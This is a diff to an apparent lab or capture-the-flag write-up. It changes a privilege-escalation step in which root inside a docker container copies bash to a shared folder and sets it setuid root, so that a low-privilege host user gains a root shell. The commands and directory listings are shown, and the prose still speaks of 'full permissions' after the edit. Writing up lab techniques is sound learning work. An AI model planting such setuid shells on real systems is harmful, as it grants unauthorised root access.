@@ -809,24 +809,26 @@ This is the file i placed in `/mnt/share` on the docker container
 
 ```python
 root@nyc-pweb03:/mnt/share# cp /bin/bash rootbash
-root@nyc-pweb03:/mnt/share# chmod 777 rootbash 
+root@nyc-pweb03:/mnt/share# chmod 4755 rootbash 
 ```
 
 So now on the docker contained ill copy `/bin/bash` to into rootbash in the current dir, then give all users full permissions on it
 
 ```python
-spencer@ip-10-0-20-19:/var/share$ ls -la      
+spencer@ip-10-0-20-19:/var/share$ ls -al
 total 1376
-drwxr-xr-x  2 root root    4096 Oct  9 17:18 .
+drwxr-xr-x  2 root root    4096 Oct  9 17:22 .
 drwxr-xr-x 15 root root    4096 Apr 15 04:40 ..
--rwxrwxrwx  1 root root 1396520 Oct  9 17:18 rootbash
+-rwsr-xr-x  1 root root 1396520 Oct  9 17:22 rootbash
 -rw-r--r--  1 root root       5 Oct  9 17:12 test
 spencer@ip-10-0-20-19:/var/share$ 
 ```
 
 Now the file has full permissions, i should be able to execute it
 
+```python
 
+```
 
 
 
